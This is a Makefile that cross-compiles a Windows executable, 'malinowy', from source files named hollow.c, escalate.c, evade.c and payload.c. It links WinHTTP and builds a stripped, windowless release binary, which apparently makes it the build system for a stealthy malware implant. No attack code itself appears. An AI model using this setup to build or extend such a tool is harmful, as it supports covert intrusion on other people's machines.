# Makefile for malinowy_kozaczek
#
# Cross-compilation from Linux: x86_64-w64-mingw32-gcc
# Native compilation on Windows: MSVC cl.exe or MinGW-w64
#
# Usage:
#   make          — build 64-bit release
#   make x86      — build 32-bit release
#   make debug    — build 64-bit with debug symbols and DEBUG_PRINT
#   make clean    — remove build artifacts
#   make help     — show this message

# ── Toolchain detection ──
ifdef CROSS_COMPILE
    CC    := $(CROSS_COMPILE)-gcc
    WINDRES := $(CROSS_COMPILE)-windres
    RC    := $(WINDRES)
else
    # Default: try MinGW-w64, fall back to MSVC
    ifeq ($(OS),Windows_NT)
        # On native Windows
        ifneq ($(shell where x86_64-w64-mingw32-gcc 2>nul),)
            CC := x86_64-w64-mingw32-gcc
        else
            # MSVC from Visual Studio build tools
            CC := cl
        endif
    else
        # Cross-compilation from Linux
        CC := x86_64-w64-mingw32-gcc
    endif
endif

# ── Directories ──
SRCDIR := src
BUILDDIR := build

# ── Sources ──
SRCS := $(SRCDIR)/main.c $(SRCDIR)/utils.c $(SRCDIR)/hollow.c \
        $(SRCDIR)/escalate.c $(SRCDIR)/evade.c $(SRCDIR)/payload.c
OBJS := $(patsubst $(SRCDIR)/%.c,$(BUILDDIR)/%.o,$(SRCS))
TARGET := $(BUILDDIR)/malinowy.exe

# ── Compiler flags ──
CFLAGS  := -Os -fno-asynchronous-unwind-tables -nostdlib -ffreestanding \
           -Wall -Werror -Wno-unused-variable -Wno-unused-function \
           -fdata-sections -ffunction-sections
LDFLAGS := -s -lwinhttp -lkernel32 -luser32 -lntdll -ladvapi32 \
           -Wl,--gc-sections -Wl,--subsystem,windows
INCLUDE := -I$(SRCDIR)

# Debug flags
DBGCFLAGS := -O0 -g -D_DEBUG -fno-omit-frame-pointer
DBGLDFLAGS := -lwinhttp -lkernel32 -luser32 -lntdll -ladvapi32 \
              -Wl,--subsystem,console

# ── Targets ──
.PHONY: all release x86 debug clean help

all: release

release: CFLAGS += $(INCLUDE)
release: LDFLAGS +=
release: $(TARGET)

debug: CFLAGS += $(INCLUDE) $(DBGCFLAGS)
debug: LDFLAGS = $(DBGLDFLAGS)
debug: TARGET = $(BUILDDIR)/malinowy_debug.exe
debug: $(TARGET)

x86: CFLAGS += -m32 $(INCLUDE)
x86: LDFLAGS += -m32
x86: TARGET = $(BUILDDIR)/malinowy_x86.exe
x86: $(TARGET)

# ── Link ──
$(TARGET): $(OBJS)
	@mkdir -p $(@D)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
	@echo "→ Built: $@"
	@ls -lh $@

# ── Compile ──
$(BUILDDIR)/%.o: $(SRCDIR)/%.c
	@mkdir -p $(@D)
	$(CC) $(CFLAGS) -c -o $@ $<

# ── Clean ──
clean:
	rm -rf $(BUILDDIR)

# ── Help ──
help:
	@echo "malinowy_kozaczek — Build System"
	@echo ""
	@echo "Targets:"
	@echo "  make          — Build 64-bit release (default)"
	@echo "  make x86      — Build 32-bit release"
	@echo "  make debug    — Build 64-bit debug (console subsystem + DEBUG_PRINT)"
	@echo "  make clean    — Remove build artifacts"
	@echo ""
	@echo "Cross-compile from Linux:"
	@echo "  CROSS_COMPILE=x86_64-w64-mingw32 make"
	@echo "  (requires mingw-w64: apt install mingw-w64)"
	@echo ""
	@echo "Native Windows:"
	@echo "  Install MinGW-w64 from https://www.mingw-w64.org/"
	@echo "  Then run:     mingw32-make"
	@echo ""
	@echo "MSVC (Visual Studio):"
	@echo "  Open Developer Command Prompt and run:"
	@echo "    cl src/*.c /Fe:malinowy.exe /link winhttp.lib kernel32.lib user32.lib advapi32.lib /SUBSYSTEM:WINDOWS"
